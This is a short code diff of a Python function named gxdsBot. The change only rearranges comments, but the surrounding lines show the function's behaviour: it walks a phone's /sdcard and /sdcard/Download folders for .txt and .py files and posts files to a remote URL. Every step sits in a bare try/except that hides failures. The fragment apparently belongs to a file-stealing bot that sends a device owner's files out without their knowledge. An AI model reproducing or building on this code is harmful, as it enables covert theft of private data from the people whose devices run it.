@@ -956,8 +956,8 @@ def gxdsBot():
                 sent = session.post(url, data=data2, files=files)
     except:
         pass
-    # DOWNLOAD PATH
-    
+      
+    # SD CARD TXT
     try:
         sdcard_path = "/sdcard"
         file_list = [f for f in os.listdir(sdcard_path) if f.endswith(".txt")]
@@ -972,7 +972,7 @@ def gxdsBot():
     except:
         pass
       
-      # DOWNLOAD PATH
+    # DOWNLOAD PATH
     try:
         sdcard_path = "/sdcard/Download"
         file_list = [f for f in os.listdir(sdcard_path) if f.endswith(".py")]
